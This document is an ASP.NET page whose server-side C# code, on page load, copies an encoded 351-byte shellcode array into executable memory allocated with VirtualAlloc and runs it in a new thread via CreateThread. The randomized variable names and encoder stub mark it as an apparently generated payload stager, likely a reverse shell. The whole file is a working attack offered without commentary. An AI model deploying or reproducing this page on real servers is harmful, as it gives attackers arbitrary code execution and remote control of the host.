<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] dQv = new byte[351] {
0xda,0xd3,0xbf,0x04,0x80,0xe7,0x33,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x52,0x31,0x7b,0x17,0x03,0x7b,0x17,0x83,0xc7,0x84,
0x05,0xc6,0x3b,0x6c,0x4b,0x29,0xc3,0x6d,0x2c,0xa3,0x26,0x5c,0x6c,0xd7,0x23,0xcf,0x5c,0x93,0x61,0xfc,0x17,0xf1,0x91,0x77,0x55,
0xde,0x96,0x30,0xd0,0x38,0x99,0xc1,0x49,0x78,0xb8,0x41,0x90,0xad,0x1a,0x7b,0x5b,0xa0,0x5b,0xbc,0x86,0x49,0x09,0x15,0xcc,0xfc,
0xbd,0x12,0x98,0x3c,0x36,0x68,0x0c,0x45,0xab,0x39,0x2f,0x64,0x7a,0x31,0x76,0xa6,0x7d,0x96,0x02,0xef,0x65,0xfb,0x2f,0xb9,0x1e,
0xcf,0xc4,0x38,0xf6,0x01,0x24,0x96,0x37,0xae,0xd7,0xe6,0x70,0x09,0x08,0x9d,0x88,0x69,0xb5,0xa6,0x4f,0x13,0x61,0x22,0x4b,0xb3,
0xe2,0x94,0xb7,0x45,0x26,0x42,0x3c,0x49,0x83,0x00,0x1a,0x4e,0x12,0xc4,0x11,0x6a,0x9f,0xeb,0xf5,0xfa,0xdb,0xcf,0xd1,0xa7,0xb8,
0x6e,0x40,0x02,0x6e,0x8e,0x92,0xed,0xcf,0x2a,0xd9,0x00,0x1b,0x47,0x80,0x4c,0xe8,0x6a,0x3a,0x8d,0x66,0xfc,0x49,0xbf,0x29,0x56,
0xc5,0xf3,0xa2,0x70,0x12,0xf3,0x98,0xc5,0x8c,0x0a,0x23,0x36,0x85,0xc8,0x77,0x66,0xbd,0xf9,0xf7,0xed,0x3d,0x05,0x22,0xa1,0x6d,
0xa9,0x9d,0x02,0xdd,0x09,0x4e,0xeb,0x37,0x86,0xb1,0x0b,0x38,0x4c,0xda,0xa6,0xc3,0x07,0xef,0x24,0x9f,0x04,0x87,0x4a,0x1f,0x88,
0x70,0xc2,0xf9,0xa4,0x90,0x82,0x52,0x51,0x08,0x8f,0x28,0xc0,0xd5,0x05,0x55,0xc2,0x5e,0xaa,0xaa,0x8d,0x96,0xc7,0xb8,0x7a,0x57,
0x92,0xe2,0x2d,0x68,0x08,0x8a,0xb2,0xfb,0xd7,0x4a,0xbc,0xe7,0x4f,0x1d,0xe9,0xd6,0x99,0xcb,0x07,0x40,0x30,0xe9,0xd5,0x14,0x7b,
0xa9,0x01,0xe5,0x82,0x30,0xc7,0x51,0xa1,0x22,0x11,0x59,0xed,0x16,0xcd,0x0c,0xbb,0xc0,0xab,0xe6,0x0d,0xba,0x65,0x54,0xc4,0x2a,
0xf3,0x96,0xd7,0x2c,0xfc,0xf2,0xa1,0xd0,0x4d,0xab,0xf7,0xef,0x62,0x3b,0xf0,0x88,0x9e,0xdb,0xff,0x43,0x1b,0xeb,0xb5,0xc9,0x0a,
0x64,0x10,0x98,0x0e,0xe9,0xa3,0x77,0x4c,0x14,0x20,0x7d,0x2d,0xe3,0x38,0xf4,0x28,0xaf,0xfe,0xe5,0x40,0xa0,0x6a,0x09,0xf6,0xc1,
0xbe };

        IntPtr hdy8Geeizz3 = VirtualAlloc(IntPtr.Zero,(UIntPtr)dQv.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(dQv,0,hdy8Geeizz3,dQv.Length);
        IntPtr bpy20PMqa = IntPtr.Zero;
        IntPtr xYZ = CreateThread(IntPtr.Zero,UIntPtr.Zero,hdy8Geeizz3,IntPtr.Zero,0,ref bpy20PMqa);
    }
</script>
